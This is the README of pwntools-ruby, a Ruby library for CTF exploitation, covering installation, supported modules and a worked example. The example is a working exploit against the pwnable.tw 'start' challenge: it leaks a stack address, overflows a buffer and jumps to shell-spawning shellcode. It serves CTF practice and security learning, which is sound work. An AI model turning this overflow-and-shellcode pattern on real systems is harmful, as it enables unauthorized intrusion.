[![GitHub stars](https://img.shields.io/github/stars/peter50216/pwntools-ruby.svg)](https://github.com/peter50216/pwntools-ruby/stargazers)
[![Dependency Status](https://img.shields.io/gemnasium/peter50216/pwntools-ruby.svg)](https://gemnasium.com/peter50216/pwntools-ruby)
[![Build Status](https://img.shields.io/travis/peter50216/pwntools-ruby.svg)](https://travis-ci.org/peter50216/pwntools-ruby)
[![Test Coverage](https://img.shields.io/codeclimate/coverage/github/peter50216/pwntools-ruby.svg)](https://codeclimate.com/github/peter50216/pwntools-ruby/coverage)
[![Code Climate](https://img.shields.io/codeclimate/github/peter50216/pwntools-ruby.svg)](https://codeclimate.com/github/peter50216/pwntools-ruby)
[![Inline docs](https://inch-ci.org/github/peter50216/pwntools-ruby.svg)](https://inch-ci.org/github/peter50216/pwntools-ruby)
[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](http://choosealicense.com/licenses/mit/)

# pwntools-ruby

Always sad when playing CTF that there's nothing equivalent to pwntools in Python.
While pwntools is awesome, I always love Ruby far more than Python...
So this is an attempt to create such library.

Would try to have consistent naming with original pwntools, and do things in Ruby style.

# Example Usage

Here's an exploitation for `start` which is a challenge on [pwnable.tw](https://pwnable.tw).

```ruby
# encoding: ASCII-8BIT
# The encoding line is important most time, or you'll get "\u0000" when using "\x00" in code,
# which is NOT what we want when doing pwn...

require 'pwn'

context.arch = 'i386'
context.log_level = :debug
z = Sock.new 'chall.pwnable.tw', 10000

z.recvuntil "Let's start the CTF:"
z.send p32(0x8048087).rjust(0x18, 'A')
stk = u32(z.recvuntil "\xff")
log.info "stack address: #{stk.hex}" # Log stack address

# Return to shellcode
addr = stk + 0x14
payload = addr.p32.rjust(0x18, 'A') + asm(shellcraft.sh)
z.write payload

# Switch to interactive mode
z.interact
```

More features and details can be found in the
[documentation](http://www.rubydoc.info/github/peter50216/pwntools-ruby/master/frames).

# Installation

Since there are two gems, which `pwntools-ruby` depends on, didn't be published to rubygems,
you should install them by self. :disappointed:

```sh
gem install pwntools

git clone https://github.com/bnagy/crabstone.git /tmp/crabstone
cd /tmp/crabstone
gem build crabstone.gemspec
gem install crabstone

git clone https://github.com/sashs/ruby-keystone.git /tmp/ruby-keystone
cd /tmp/ruby-keystone/keystone_gem
gem build keystone.gemspec
gem install keystone
```

Some of the features (assembling/disassembling) require non-Ruby dependencies. Checkout the
installation guide for
[keystone-engine](https://github.com/keystone-engine/keystone/tree/master/docs) and
[capstone-engine](http://www.capstone-engine.org/documentation.html).

Or you are able to get running quickly with

```sh
# Install Capstone
sudo apt-get install libcapstone3

# Compile and install Keystone from source
sudo apt-get install cmake
git clone https://github.com/keystone-engine/keystone.git /tmp/keystone
cd /tmp/keystone
mkdir build
cd build
../make-share.sh
sudo make install
```

# Supported Features

## Architectures

- [x] i386
- [x] amd64
- [ ] arm
- [ ] thumb

## Modules

- [x] context
- [x] asm
- [x] disasm
- [x] shellcraft
- [x] elf
- [x] dynelf
- [x] logger
- [ ] tube
  - [x] sock
  - [ ] process
- [ ] fmtstr
- [x] util
  - [x] pack
  - [x] cyclic
  - [x] fiddling

# Development
```sh
git clone git@github.com:peter50216/pwntools-ruby.git
cd pwntools-ruby
rake
```

# Note to irb users
irb defines `main.context`.

For the ease of exploit development in irb, that method would be removed if you use `require 'pwn'`.

You can still get the `IRB::Context` by `irb_context`.
